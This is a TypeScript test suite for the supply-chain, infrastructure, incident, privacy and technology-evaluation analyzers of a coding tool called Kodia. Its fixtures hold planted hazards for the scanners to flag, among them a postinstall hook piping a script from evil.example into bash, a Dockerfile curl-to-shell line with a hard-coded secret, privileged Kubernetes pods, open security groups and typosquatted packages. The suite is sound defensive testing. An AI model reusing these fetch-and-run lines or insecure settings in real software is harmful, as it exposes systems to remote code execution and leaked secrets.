/*--------------------------------------------------------------------------------------
 *  Copyright 2025 Glass Devtools, Inc. All rights reserved.
 *  Licensed under the Apache License, Version 2.0. See LICENSE.txt for more information.
 *--------------------------------------------------------------------------------------*/

import assert from 'assert';
import { assessRisk } from '../../common/autonomyPolicy.js';
import {
	analyzeIacAndFinOps,
	analyzeMigrationSafety,
	analyzePrivacyCompliance,
	analyzeProductionIncidentLogs,
	analyzeSupplyChainWorkspace,
	buildAutonomousReleasePlan,
	evaluateTechnologyForEvolution,
	planLegacyModernization,
	runCapabilityEvolutionRadar,
} from '../../common/evolutionEngine.js';
import { routingRoleForContext } from '../../common/modelRouting.js';
import { builtinTools } from '../../common/prompt/prompts.js';
import { ScannedSourceFile } from '../../common/projectHealth.js';
import { SUBAGENT_TYPES } from '../../common/subagents.js';
import { getToolCategory } from '../../common/toolDisplayMeta.js';

const EXPECTED_EVOLUTION_TOOLS = [
	'evolution_open_hub',
	'evolution_supply_chain_sbom',
	'evolution_audit_iac_finops',
	'evolution_analyze_incident',
	'evolution_plan_release',
	'evolution_audit_privacy_compliance',
	'evolution_plan_modernization',
	'evolution_run_capability_radar',
	'evolution_evaluate_technology',
	'evolution_manage_proposals',
	'evolution_schedule_periodic_audit',
	'evolution_workspace_overview',
] as const;

suite('Kodia - Next-Gen Evolution, Supply-Chain, IaC/FinOps, Ops & Governance Engine (Common)', () => {

	test('registers all 12 evolution_* tools, metadata, risk tiers & read-only specialists', () => {
		for (const name of EXPECTED_EVOLUTION_TOOLS) {
			assert.ok(name in builtinTools, `Missing builtin tool schema: ${name}`);
			assert.strictEqual(getToolCategory(name), 'ai', `${name} must belong to ai category`);
			const risk = assessRisk(name, {});
			assert.ok(risk === 'low' || risk === 'medium', `${name} must have low/medium risk tier`);
		}
		assert.ok('supply_chain_ops' in SUBAGENT_TYPES);
		assert.strictEqual(SUBAGENT_TYPES.supply_chain_ops.canChangeFiles, false);
		assert.ok('evolution_scout' in SUBAGENT_TYPES);
		assert.strictEqual(SUBAGENT_TYPES.evolution_scout.canChangeFiles, false);
		assert.strictEqual(routingRoleForContext({ subagentRole: 'evolution_scout' }), 'review');
		assert.strictEqual(routingRoleForContext({ subagentRole: 'supply_chain_ops' }), 'review');
	});

	test('Supply-Chain & CycloneDX 1.5 SBOM detects unpinned versions, typosquats, risky postinstall & strong copyleft licenses', () => {
		const files: ScannedSourceFile[] = [
			{
				relativePath: 'package.json',
				content: JSON.stringify({
					name: 'demo-app',
					dependencies: {
						'express': '4.19.2',
						'expres': '*', // typosquat + wildcard!
						'gpl-lib': '^1.0.0',
					},
					scripts: {
						postinstall: 'curl https://evil.example/payload.sh | bash',
					},
				}),
			},
			{
				relativePath: 'package-lock.json',
				content: JSON.stringify({
					packages: {
						'node_modules/express': { license: 'MIT' },
						'node_modules/gpl-lib': { license: 'AGPL-3.0' },
					},
				}),
			},
			{
				relativePath: 'requirements.txt',
				content: `fastapi==0.115.0\nreqeusts>=2.0\n`,
			},
		];

		const report = analyzeSupplyChainWorkspace(files, { blockCopyleft: true });
		assert.strictEqual((report.cyclonedxSbom as { bomFormat: string; specVersion: string }).bomFormat, 'CycloneDX');
		assert.strictEqual((report.cyclonedxSbom as { specVersion: string }).specVersion, '1.5');
		assert.strictEqual(report.componentCount, 5);
		assert.ok(report.ecosystemsDetected.includes('npm') && report.ecosystemsDetected.includes('pypi'));
		assert.ok(report.findings.some(f => f.category === 'typosquat' && f.packageName === 'expres'), 'Must detect typosquat expres');
		assert.ok(report.findings.some(f => f.category === 'lifecycle-script' && f.severity === 'critical'), 'Must detect curl|bash postinstall');
		assert.ok(report.findings.some(f => f.category === 'license' && f.packageName === 'gpl-lib' && f.severity === 'critical'), 'Must escalate AGPL-3.0 when blockCopyleft=true');
	});

	test('IaC Security & FinOps Cost Intelligence audits Dockerfile, Kubernetes, Terraform & GitHub Actions', () => {
		const files: ScannedSourceFile[] = [
			{
				relativePath: 'Dockerfile',
				content: `FROM node:latest\nENV API_SECRET=supersecret\nRUN curl -sSL https://x.sh | sh\nCMD ["node", "app.js"]\n`,
			},
			{
				relativePath: 'k8s/deploy.yaml',
				content: `apiVersion: apps/v1\nkind: Deployment\nspec:\n  replicas: 4\n  template:\n    spec:\n      hostNetwork: true\n      containers:\n        - name: app\n          securityContext:\n            privileged: true\n          resources:\n            requests:\n              cpu: "1000m"\n`,
			},
			{
				relativePath: 'infra/main.tf',
				content: `resource "aws_security_group" "open" {\n  cidr_blocks = ["0.0.0.0/0"]\n}\nresource "aws_db_instance" "db" {\n  instance_class = "db.m5.xlarge"\n  storage_encrypted = false\n}\n`,
			},
			{
				relativePath: '.github/workflows/ci.yml',
				content: `permissions: write-all\njobs:\n  build:\n    steps:\n      - uses: thirdparty/action@main\n`,
			},
		];

		const report = analyzeIacAndFinOps(files, 300);
		const rules = new Set(report.findings.map(f => f.ruleId));
		assert.ok(rules.has('KODIA-DOCKER-001') && rules.has('KODIA-DOCKER-002') && rules.has('KODIA-DOCKER-003') && rules.has('KODIA-DOCKER-004'));
		assert.ok(rules.has('KODIA-K8S-001') && rules.has('KODIA-K8S-002') && rules.has('KODIA-K8S-003'));
		assert.ok(rules.has('KODIA-TF-001') && rules.has('KODIA-TF-002'));
		assert.ok(rules.has('KODIA-GHA-001') && rules.has('KODIA-GHA-002'));
		assert.ok(report.estimatedMonthlyUsd > 300, 'Must estimate cloud spend from K8s + Terraform');
		assert.strictEqual(report.budgetExceeded, true, 'Must detect monthly budget overrun');
		assert.ok(report.potentialMonthlySavingsUsd > 0, 'Must compute right-sizing savings');
	});

	test('Production Incident Forensics, SLO Burn Rate, Migration Safety & Autonomous Release Plan', () => {
		const logs = [
			'2026-11-23T01:00:01Z INFO GET /health 200 latency=12ms',
			'2026-11-23T01:00:02Z ERROR POST /checkout 500 ECONNREFUSED db latency=920ms',
			'2026-11-23T01:00:03Z ERROR POST /checkout 500 ECONNREFUSED db latency=880ms',
			'2026-11-23T01:00:04Z INFO GET /items 200 latency=45ms',
		].join('\n');

		const inc = analyzeProductionIncidentLogs({ serviceName: 'checkout-api', logText: logs, sloTargetPct: 99.9, p95BudgetMs: 400 });
		assert.strictEqual(inc.errorCount, 2);
		assert.strictEqual(inc.sloBreached, true);
		assert.ok(inc.errorBudgetBurnRate > 100);
		assert.ok((inc.latencyMs?.p95 ?? 0) >= 880);
		assert.ok(inc.clusters.length >= 1);
		assert.match(inc.postmortemDraft, /Incident Postmortem Draft/);

		const migFiles: ScannedSourceFile[] = [
			{ relativePath: 'migrations/004_drop.sql', content: `ALTER TABLE users DROP COLUMN legacy_token;\nDROP TABLE old_sessions;\nCREATE INDEX idx_orders_user ON orders(user_id);\n` },
		];
		const migs = analyzeMigrationSafety(migFiles);
		assert.strictEqual(migs.length, 3);

		const rel = buildAutonomousReleasePlan({
			currentVersion: '1.2.3',
			commitSubjects: ['feat(api): add batch endpoint', 'fix(auth): validate issuer'],
			files: migFiles,
		});
		assert.strictEqual(rel.recommendedBump, 'minor');
		assert.strictEqual(rel.nextVersion, '1.3.0');
		assert.strictEqual(rel.releaseSafe, false, 'Destructive migration must mark releaseSafe=false');
	});

	test('Data Governance (GDPR/SOC2/HIPAA/EU AI Act), Legacy Modernization & Permanent Capability Evolution Hype Filter (§6)', () => {
		const files: ScannedSourceFile[] = [
			{
				relativePath: 'src/legacyAuth.ts',
				content: [
					`export function evaluateUser(patientName: string, ssn: string) {`,
					`  console.log("processing", patientName, ssn);`,
					`  var buf = new Buffer(ssn);`,
					`  const score = loanApproval(buf);`,
					`  return score;`,
					`}`,
				].join('\n'),
			},
			{ relativePath: 'src/a.ts', content: `import { evaluateUser } from './legacyAuth.js'; export const a = evaluateUser;` },
			{ relativePath: 'src/b.ts', content: `import { evaluateUser } from './legacyAuth.js'; export const b = evaluateUser;` },
			{ relativePath: 'src/c.ts', content: `import { evaluateUser } from './legacyAuth.js'; export const c = evaluateUser;` },
			{ relativePath: 'src/d.ts', content: `import { evaluateUser } from './legacyAuth.js'; export const d = evaluateUser;` },
		];

		const priv = analyzePrivacyCompliance(files);
		assert.strictEqual(priv.frameworkSummary.GDPR.status, 'blocker');
		assert.strictEqual(priv.frameworkSummary.HIPAA.status, 'blocker');
		assert.strictEqual(priv.frameworkSummary.EU_AI_ACT.status, 'attention');
		assert.ok(priv.missingControls.length >= 1);

		const mod = planLegacyModernization(files);
		assert.ok(mod.monolithHotspots.some(h => h.file === 'src/legacyAuth.ts' && h.fanIn >= 4));
		assert.ok(mod.deprecatedPatterns.some(d => /Buffer/.test(d.pattern)));
		assert.strictEqual(mod.waves.length, 3);

		// Permanent Capability Evolution Radar & Hype Filter (§6)
		const radar = runCapabilityEvolutionRadar({ workspaceEcosystems: ['Node/TypeScript'], kodiaCapabilitiesCount: 15 });
		assert.ok(radar.topAdoptionCandidates.length >= 2);
		assert.ok(radar.rejectedAsHypeOrIncompatible.length >= 2);
		assert.ok(radar.evaluations.every(e => e.autoInstallAllowed === false), 'Hard invariant: autoInstallAllowed must ALWAYS be false');

		const hype = evaluateTechnologyForEvolution({
			name: 'Magic Zero-Test AGI Wrapper',
			domain: 'ai-agents',
			summary: 'Claims zero bugs with no benchmarks',
			license: 'Unknown',
			maturity: 'experimental',
			benchmarksOrEvidenceCount: 0,
			knownSecurityConcerns: ['Executes arbitrary unverified code'],
		});
		assert.strictEqual(hype.verdict, 'REJECT_HYPE');
		assert.strictEqual(hype.autoInstallAllowed, false);

		const incompatible = evaluateTechnologyForEvolution({
			name: 'AGPL Closed Wrapper',
			domain: 'developer-workflows',
			summary: 'Requires AGPL-3.0 linking',
			license: 'AGPL-3.0',
			maturity: 'production-proven',
			benchmarksOrEvidenceCount: 4,
		});
		assert.strictEqual(incompatible.verdict, 'REJECT_INCOMPATIBLE');

		const adopt = evaluateTechnologyForEvolution({
			name: 'OpenTelemetry OTLP Trace Bridge',
			domain: 'infrastructure-cloud',
			summary: 'Standard distributed trace correlation',
			license: 'Apache-2.0',
			maturity: 'production-proven',
			benchmarksOrEvidenceCount: 5,
		});
		assert.strictEqual(adopt.verdict, 'ADOPT_CANDIDATE');
		assert.strictEqual(adopt.autoInstallAllowed, false);
	});
});
